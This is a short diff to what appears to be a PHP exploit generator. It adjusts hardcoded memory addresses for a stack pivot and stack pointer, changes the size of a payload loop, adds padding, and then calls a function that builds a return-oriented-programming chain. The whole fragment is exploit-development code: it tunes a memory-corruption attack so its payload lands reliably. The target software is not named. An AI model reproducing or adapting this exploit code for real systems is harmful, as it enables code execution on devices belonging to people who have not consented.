@@ -23,14 +23,14 @@ else
 	return;
 }
 
-$STACKPIVOTDATA_ADR = 0x90eaa14+0x68;//These need moved or something, since it's rather random what lands here in memory it seems.
-$STACKPTR_ADR = 0x0908f014;
+$STACKPIVOTDATA_ADR = 0x08e20800;
+$STACKPTR_ADR = 0x08f73014;
 
 $ROPHEAP = $STACKPIVOTDATA_ADR;
 
 $STACKPIVOTDATA = "\"";
 
-for($i=0; $i<(0x94>>2);)
+for($i=0; $i<(0x7c>>2);)
 {
 	if($i < (0x34>>2))
 	{
@@ -53,6 +53,7 @@ for($i=0; $i<(0x94>>2);)
 		$i+=3;
 	}
 }
+$STACKPIVOTDATA .= genu32_unicode($STACKPTR_ADR);//padding
 $STACKPIVOTDATA .= "\"";
 
 generate_ropchain();
